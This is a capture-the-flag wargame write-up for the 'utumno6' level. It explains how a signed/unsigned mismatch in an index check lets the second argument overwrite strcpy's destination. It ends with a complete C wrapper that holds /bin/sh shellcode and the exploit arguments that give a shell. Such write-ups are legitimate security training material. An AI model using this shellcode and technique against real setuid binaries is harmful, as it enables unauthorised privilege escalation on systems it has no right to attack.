@@ -1,0 +1,72 @@
+Odd level, I struggled with it a bit....
+
+The premise (upon executing the program with the correct (3) number of arguments), is that 
+utumno6 uses strcpy to write
+
+
+Utumno6 takes in 3 args:
+
+arg1: integer that represents table position (has to be less than 10)
+arg2: hex value that represents the 'table value'
+arg3: 'Description' that SHOULD be written into the heap
+
+arg1 and 2 are converted into their proper variable values using strtoul (string to unsigned long)
+arg1 is base 10, arg2 is base 16
+
+Provided argv1 is less than 10, arg2 is then written into EBP-0x30+(argv[1] << 2).
+
+Fortunately for us, the check for argv[1] is signed, whereas the offset
+that is written to using argv[1] is UNSIGNED.
+
+				chunk of utumno6->main
+	┌─────────────────────────────────────────────────────────────────┐
+	│ int32_t table_value = strtoul@GOT(argv[2], 0, 16, heap_location)│
+	│ int32_t table_position = strtoul@GOT(argv[1], 0, 0xa)           │
+	│ if (table_position s<= 10)                                      │ //check if argv[1] is 'less than 10'
+	│ ...                                                             │
+	└─────────────────────────────────────────────────────────────────┘ 
+				│
+				│
+				└───────┐
+					│
+				chunk 2 of utumno6->main
+		┌──────────────────────────────────────────────┐
+		│ *(EBP - 0x30 + (table_position << 2)) = table_value │ //table_position as unsigned int is used to write table_value
+		│ strcpy@GOT(heap_location, argv[3])           │ 
+		└──────────────────────────────────────────────┘ 
+
+What this means is if we pass a large number in for argv[1] such as 4294967295, stroul takes in its unsigned form and
+converts it to hex, 0xffffffff. When the check is performed, it treats the value as a SIGNED integer instead,
+making 0xffffffff equal to -1, instead of 4294967295, thereby passing the check.
+
+Now that we're pass the check, the calculation EBP -0x30 + table_position*4 is performed, writing argv[2]'s bytes to that location.
+
+Before this gave me a lot of trouble, because I tried to find the right argv[1] to pass in to get argv[2] written to the return address
+directly... a waste of time.
+
+Turns out, using -1 as argv[1] results in argv[2]'s value being written direclty to the top of the stack.
+
+That works out perfectly, because when strcpy is called shortly after, the heap location (parameter 1) that should've been written to
+ends up being overwritten with argv[2]'s value.
+
+Great! Now we can alter where strcpy writes to!
+
+All thats left is editing argv[3]'s "description" to contain the bytes pointing to shellcode on the stack and you're golden!
+
+I wrote (as usual) a wrapper file to get a shell on the server.
+
+				     u6wrapper.c
+	┌────────────────────────────────────────────────────────────────────┐
+	│#include <unistd.h>                                                 │
+	│                                                                    │
+	│int main(void) {                                                    │
+	│	char *environment[2] = {"SHELLCODE=\x50\xd4\xff\xff\x31\xc0  │
+	│	\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73 │
+	│	\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c │
+	│	\x24\x89\xe1\xb0\x0b\xcd\x80", 0};                           │ 
+	│                                                                    │
+	│	char *argv[5] = {"/utumno/utumno6", "4294967295",            │
+	│           "ffffde0c", "\xba\xdf\xff\xff", 0};                      │
+	│	execve("/utumno/utumno6", argv, environment);                │
+	│}                                                                   │
+	└────────────────────────────────────────────────────────────────────┘ 
